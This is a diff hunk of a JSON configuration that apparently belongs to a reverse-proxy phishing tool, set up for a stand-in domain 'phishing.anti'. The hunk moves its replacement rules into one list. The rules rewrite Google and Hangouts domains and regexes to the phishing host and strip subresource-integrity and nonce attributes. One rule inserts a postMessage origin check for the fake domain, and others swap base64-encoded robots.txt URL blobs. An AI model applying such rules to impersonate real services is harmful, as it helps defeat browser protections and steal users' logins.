@@ -30,52 +30,48 @@
           "Set-Cookie",
           "Access-Control-Allow-Origin"
         ],
-        "body": {
-          "universal": [
-            [
-              "integrity=\"",
-              "no-integrity=\""
-            ],
-            [
-              "nonce=\"",
-              "nononce=\""
-            ]
+        "custom": [
+          [
+            "integrity=\"",
+            "no-integrity=\""
           ],
-          "custom": [
-            [
-              "var k=c.postMessage?c:c.document;k.postMessage",
-              "if(f.J == \"https://hangouts.phishing.anti\")return;\nvar k=c.postMessage?c:c.document;k.postMessage"
-            ],
-            [
-              "allow=\"microphone *; autoplay *\" src=\"https://hangouts.",
-              "allow=\"microphone *; autoplay *\" nosrc=\"https://hangouts."
-            ],
-            [
-              "|(google))\\.com",
-              "|(google)|(phishing))(\\.anti|\\.com)"
-            ],
-            [
-              ".google\\.(((co|com)",
-              ".(google|phishing)\\.(((co|com|anti)"
-            ],
-            [
-              ".google\\.com",
-              ".phishing\\.anti"
-            ],
-            [
-              "\\.google(rs)?\\.com",
-              "\\.(google(rs)|phishing)?\\.(com|anti)"
-            ],
-            [
-              "LCJwcHUiOiJodHRwczovL21haWwuZ29vZ2xlLmNvbS9yb2JvdHMudHh0IiwibHB1IjoiaHR0cHM6Ly9oYW5nb3V0cy5nb29nbGUuY29tL3JvYm90cy50eHQifQ",
-              "LCJwcHUiOiJodHRwczovL21haWwucGhpc2hpbmcuYW50aS9yb2JvdHMudHh0IiwibHB1IjoiaHR0cHM6Ly9oYW5nb3V0cy5waGlzaGluZy5hbnRpL3JvYm90cy50eHQifQ=="
-            ],
-            [
-              "LCJwcHUiOiJodHRwczovL2hhbmdvdXRzLmdvb2dsZS5jb20vcm9ib3RzLnR4dCIsImxwdSI6Imh0dHBzOi8vaGFuZ291dHMuZ29vZ2xlLmNvbS9yb2JvdHMudHh0In0",
-              "LCJwcHUiOiJodHRwczovL2hhbmdvdXRzLnBoaXNoaW5nLmFudGkvcm9ib3RzLnR4dCIsImxwdSI6Imh0dHBzOi8vaGFuZ291dHMucGhpc2hpbmcuYW50aS9yb2JvdHMudHh0In0="
-            ]
+          [
+            "nonce=\"",
+            "nononce=\""
+          ],
+          [
+            "var k=c.postMessage?c:c.document;k.postMessage",
+            "if(f.J == \"https://hangouts.phishing.anti\")return;\nvar k=c.postMessage?c:c.document;k.postMessage"
+          ],
+          [
+            "allow=\"microphone *; autoplay *\" src=\"https://hangouts.",
+            "allow=\"microphone *; autoplay *\" nosrc=\"https://hangouts."
+          ],
+          [
+            "|(google))\\.com",
+            "|(google)|(phishing))(\\.anti|\\.com)"
+          ],
+          [
+            ".google\\.(((co|com)",
+            ".(google|phishing)\\.(((co|com|anti)"
+          ],
+          [
+            ".google\\.com",
+            ".phishing\\.anti"
+          ],
+          [
+            "\\.google(rs)?\\.com",
+            "\\.(google(rs)|phishing)?\\.(com|anti)"
+          ],
+          [
+            "LCJwcHUiOiJodHRwczovL21haWwuZ29vZ2xlLmNvbS9yb2JvdHMudHh0IiwibHB1IjoiaHR0cHM6Ly9oYW5nb3V0cy5nb29nbGUuY29tL3JvYm90cy50eHQifQ",
+            "LCJwcHUiOiJodHRwczovL21haWwucGhpc2hpbmcuYW50aS9yb2JvdHMudHh0IiwibHB1IjoiaHR0cHM6Ly9oYW5nb3V0cy5waGlzaGluZy5hbnRpL3JvYm90cy50eHQifQ=="
+          ],
+          [
+            "LCJwcHUiOiJodHRwczovL2hhbmdvdXRzLmdvb2dsZS5jb20vcm9ib3RzLnR4dCIsImxwdSI6Imh0dHBzOi8vaGFuZ291dHMuZ29vZ2xlLmNvbS9yb2JvdHMudHh0In0",
+            "LCJwcHUiOiJodHRwczovL2hhbmdvdXRzLnBoaXNoaW5nLmFudGkvcm9ib3RzLnR4dCIsImxwdSI6Imh0dHBzOi8vaGFuZ291dHMucGhpc2hpbmcuYW50aS9yb2JvdHMudHh0In0="
           ]
-        }
+        ]
       }
     },
     "remove": {
